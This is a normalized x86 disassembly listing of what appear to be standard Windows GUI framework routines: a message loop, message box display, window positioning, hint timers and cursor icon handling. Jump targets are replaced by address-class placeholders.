sub_4544ec
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_43b8e8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403360
test al al
jne r-xdata
sub_454558
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_4544b8
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4543b0
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_454400
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45438c
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_4545f0
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_454558
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_454ec0
sub_454614
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_416af8
mov eax 0x8
call sub_402734
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_4169bc
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_454670
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_416b18
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402754
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_416a08
jmp r-xdata
sub_454704
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_454742
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_43b8c4
mov [ esi + 0x44 ] edi
sub_454784
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_454862
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_44b694
call sub_407b80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454869
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_44ee78
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_454829
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4545f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_44dd80
mov eax [ ebp - 0x4 ]
call sub_454154
jmp r-xdata
sub_454884
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_4027c4
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_4027e4
push eax
call sub_4027c4
pop edx
call sub_40b35c
call sub_4027c4
mov edx [ rw-data ]
call sub_4032f0
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_4027c4
mov edx eax
mov eax ebx
call sub_454a7c
pop esi
pop ebx
retn
call sub_4027c4
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_454914
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_44b71c
mov [ ebp - 0x10 ] eax
call sub_44b638
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_4538b8
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_454a69
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454a70
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_44b7d0
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_44b640
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_454a7c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454b37
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403f34
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_454340
mov eax [ ebp - 0x108 ]
call sub_40435c
push eax
mov eax [ ebp - 0x4 ]
call sub_40435c
mov edx eax
mov eax ebx
pop ecx
call sub_454914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454b3e
lea eax [ ebp - 0x108 ]
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax [ ebp - 0x4 ]
call sub_408340
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c6c
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a84
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404164
sub_454b54
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_43ba84
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_43bbec
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_4551f8
test al al
je r-xdata
call sub_43b8e8
mov ebp eax
mov eax edi
call sub_43b8e8
mov ebp eax
mov eax esi
call sub_4551f8
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_454cbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_454d14
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4551f8
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455a44
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454d1b
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_454d24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_454d7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4551f8
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455a44
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454d83
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_454d94
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403164
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_4352ac
jmp r-xdata
sub_454de4
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_452390
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_43b8e8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45237c
mov ebx eax
mov eax ebx
call sub_43bbec
test al al
je r-xdata
mov eax ebx
call sub_43b8e8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_454e48
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_4339b8
mov edi eax
call sub_4322b4
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_4362b4
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_4362b4
sub_454ec0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454fd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_454e48
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_452ef8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_432270
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_455080
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_4035ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_455418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454de4
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41c318
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454fd7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ec0
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_454fe0
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_452374
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_452360
movzx edx di
xor ecx ecx
call sub_4362b4
inc esi
dec ebx
jne r-xdata
sub_45501c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_454138
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_454138
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_454fe0
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_455080
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4042a8
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403ef0
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f168
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441810
xor eax eax
push ebp
push sub_455105
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403164
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_455114
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_455170
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_452374
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_455114
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_452360
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_455114
pop ecx
jmp r-xdata
mov eax ebx
call sub_43bbec
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call IsChild
test eax eax
jne r-xdata
sub_4551f8
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40575c
call sub_425da8
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_455220
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_455264
push sub_452f50
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_455418
sub_45528c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069f4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_434c24
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_4339b8
call sub_452f30
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_455418
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069f4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_434c24
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_455418
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_455220
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_4362b4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_4556b0
jmp r-xdata
sub_45539c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_455264
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_4556b0
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4553d4
jmp r-xdata
sub_4553d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43bbec
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_43b8e8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_43b8e8
push eax
call ShowWindow
sub_455418
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4553d4
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_4530b8
mov eax ebx
call sub_455264
sub_455450
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_455592
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_42163c
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407b34
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_455563
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4216f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45556a
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402754
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_455440
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_455440
mov [ ebp - 0x4 ] eax
sub_45556a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_4555a4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403164
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4030ac
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_455604
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45569e
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4556a5
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f8c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_420220
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c050
mov ebx eax
inc ebx
sub_4556b0
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
